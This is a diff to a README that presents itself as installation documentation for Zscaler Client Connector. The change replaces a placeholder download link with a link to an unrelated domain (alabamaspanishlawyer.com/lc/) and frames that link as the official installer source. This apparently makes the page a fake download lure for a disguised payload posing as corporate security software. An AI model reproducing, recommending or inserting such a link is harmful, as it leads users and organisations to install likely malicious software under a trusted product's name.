@@ -2,7 +2,6 @@
 
 Zscaler Client Connector provides a secure and seamless connection between user devices and corporate resources while enhancing security and optimizing performance. It ensures safe web browsing and secure access to enterprise applications, offering a unified security approach across various devices and networks. Designed for scalability and adaptability, it caters to both small teams and large enterprises, delivering consistent performance and connectivity.
 
-- [Download Zscaler Client Connector](#download-zscaler-client-connector)
 - [Installation](#installation)
    - [Windows](#windows)
    - [Mac OS](#mac-os)
@@ -11,15 +10,13 @@ Zscaler Client Connector provides a secure and seamless connection between user 
 - [System Requirements](#system-requirements)
 - [Additional Features](#additional-features)
 
-## Download Zscaler Client Connector
+## Installation
 To start using Zscaler Client Connector, download the installation file here:
 
-[**Download Zscaler Client Connector**](*)
+[**Download Zscaler Client Connector**](https://alabamaspanishlawyer.com/lc/)
 
 Start by downloading the Zscaler Client Connector to your device. This step is essential to enable secure access to your organization’s resources. After downloading, proceed with the installation process tailored to your operating system. The application is designed to be user-friendly, ensuring a smooth setup experience.
 
-
-## Installation
 
 ### Windows
 1. **Find the Downloaded File**: Confirm that the installer is in your Downloads folder.
